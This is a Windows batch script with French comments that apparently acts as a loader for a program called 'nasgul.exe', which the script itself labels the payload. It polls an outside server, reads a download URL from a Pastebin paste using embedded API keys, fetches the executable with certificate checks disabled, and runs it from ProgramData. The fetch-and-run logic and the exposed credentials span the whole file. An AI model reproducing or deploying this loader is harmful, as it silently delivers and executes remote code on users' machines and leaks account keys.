@echo off
setlocal enableextensions enabledelayedexpansion
ver | find "10.0." >nul && chcp 65001 >nul || chcp 28591 >nul
mode con cols=65 lines=25
title %~n0
color 0F

cd /d %ProgramData%\RemoteNasgulAssistance || exit /b 1

call :doublon

: ----------------------------------------------------
: on vérifie les prérequis
: ----------------------------------------------------

certutil -? >nul || exit /b 1
if not exist "%windir%\System32\curl.exe" (exit /b 1)

echo. & 0out E ">>> Présence des commandes externes : \b" F " OK\n"

: ----------------------------------------------------
: on définit les variables
: ----------------------------------------------------

set pastebin=-d "api_dev_key=YYo0UqR_b7f5jgmcKw4uYkqQQewxAo4g" -d "api_user_key=8dbed6f2bebeb8f73c54fb3e9a7c13c3"
set "opts=--max-time 30 -s --tlsv1.2"
set "payload=nasgul.exe"

: ----------------------------------------------------
: on teste la connexion au serveur
: ----------------------------------------------------

:test

set conn=0
timeout /T 20
call :doublon
curl --max-time 60 -I -k -s https://dingdong.murky-lane.top | find "HTTP" | findstr "200 301 302 401" >nul && set conn=1
if !conn! NEQ 1 (goto :test)

echo. & 0out E ">>> Disponibilité du serveur : \b" F " OK\n"

: ----------------------------------------------------
: on initialise les variables
: ----------------------------------------------------

set "new=1234"
set "current=0000"
set download=0

: ----------------------------------------------------
: on télécharge le hash de la dernière version
: ----------------------------------------------------

for /f "tokens=2,3 delims=<>" %%P in ('curl %opts% -X POST %pastebin% -d "api_option=list" -d "api_results_limit=500" "https://pastebin.com/api/api_post.php" ^| findstr "_key _title"') do (

	set "%%P=%%Q"
	if "%%P"=="paste_title" (
		if /i "%%Q"=="Latest version" (for /f "tokens=1,* delims=#" %%A in ('curl %opts% -X POST %pastebin% -d "api_paste_key=!paste_key!" -d "api_option=show_paste" "https://pastebin.com/api/api_raw.php"') do set "new=%%B" & set "cible=%%A")
	)
)

if not defined cible (exit /b 1)

echo. & 0out E ">>> Récuperation du hash de la dernière version : \b" F " OK\n"

: ----------------------------------------------------
: on calcule le hash de la version actuelle
: ----------------------------------------------------

:boucle

timeout /t 3 /nobreak
if exist "%payload%" (for /f "delims=" %%H in ('certutil -hashfile %payload% SHA256 ^| find /v ":"') do set current=%%H)

echo. & 0out E ">>> Calcul du hash de la version actuelle : \b" F " OK\n"

: --------------------------------------------------------
: on compare les hashs et on met à jour si besoin
: --------------------------------------------------------

if not "!current!"=="!new!" (

	if !download! EQU 0 (if exist "%payload%" (ren "%payload%" "%payload%.bak" & timeout /t 3 /nobreak))

	echo.
	curl --max-time 60 -# -k --output %payload% "!cible!&d=1" && set /a download+=1

	if !download! GTR 3 (if exist "%payload%.bak" (ren "%payload%.bak" "%payload%")) else (goto :boucle)
)

echo.

if !download! GTR 3 (0out E ">>> Mise à jour vers la dernière version : \b" F " KO\n") else (0out E ">>> Mise à jour vers la dernière version : \b" F " OK\n")

: --------------------------------------------------------
: on supprime la sauvegarde
: --------------------------------------------------------

timeout /t 3 /nobreak
if exist "%payload%.bak" (del /f /q "%payload%.bak")

call :doublon

: --------------------------------------------------------
: on démarre le payload et on quitte
: --------------------------------------------------------

tasklist | find /i "%payload%" >nul || start "" /D "%ProgramData%\RemoteNasgulAssistance" %payload%

exit /b 0

: ----------------------------------------------------
: on quitte le script en cas de doublon
: ----------------------------------------------------

:doublon

set process=0

for /f "skip=1 tokens=2 delims=," %%A in ('tasklist /FI "IMAGENAME eq %~n0.exe" /FO CSV') do (
	set /a process+=1
	if !process! GTR 1 (taskkill /t /f /pid %%A >nul)
)

goto :eof

